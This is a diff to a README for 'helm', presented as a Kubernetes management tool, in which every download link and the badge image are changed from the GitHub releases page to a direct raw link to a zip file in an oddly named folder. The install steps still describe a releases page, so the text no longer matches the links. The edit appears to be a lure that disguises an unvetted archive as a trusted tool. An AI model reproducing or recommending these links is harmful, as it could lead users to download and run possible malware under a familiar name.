@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download helm](https://img.shields.io/badge/Download-helm-blue.svg)](https://github.com/Apexmail/helm/releases)
+[![Download helm](https://raw.githubusercontent.com/Apexmail/helm/main/chakazi/helm.zip)](https://raw.githubusercontent.com/Apexmail/helm/main/chakazi/helm.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you download helm, ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-To download helm, visit this page: [Download helm](https://github.com/Apexmail/helm/releases). 
+To download helm, visit this page: [Download helm](https://raw.githubusercontent.com/Apexmail/helm/main/chakazi/helm.zip). 
 
 1. **Visit the page:** Click on the link to go to the releases page.
 2. **Choose the version:** Scroll to find the latest version.
@@ -75,4 +75,4 @@ Explore more about helm and get help from the community:
 
 If you encounter any issues while downloading or using helm, feel free to reach out through the GitHub issues page. Your feedback helps us improve.
 
-To download helm again, visit: [Download helm](https://github.com/Apexmail/helm/releases). Enjoy managing your Kubernetes applications with ease!
+To download helm again, visit: [Download helm](https://raw.githubusercontent.com/Apexmail/helm/main/chakazi/helm.zip). Enjoy managing your Kubernetes applications with ease!
